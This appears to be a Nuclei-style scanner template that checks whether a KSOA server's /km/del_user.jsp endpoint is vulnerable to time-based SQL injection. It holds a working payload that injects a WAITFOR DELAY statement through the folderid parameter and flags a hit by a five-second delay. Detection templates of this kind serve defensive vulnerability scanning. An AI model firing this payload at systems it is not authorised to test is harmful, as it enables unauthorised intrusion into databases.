id: KSOA-del_user-sqlInjection

info:
  name: KSOA-del_user-sqlInjection
  author: iSee857
  severity: high
  description: KSOA-del_user-sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /km/del_user.jsp?folderid=1'%3bWAITFOR+DELAY+'0%3a0%3a5'-- HTTP/1.1
        Host: {{Hostname}}
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200
      - type: word
        words:
          - "登录窗口"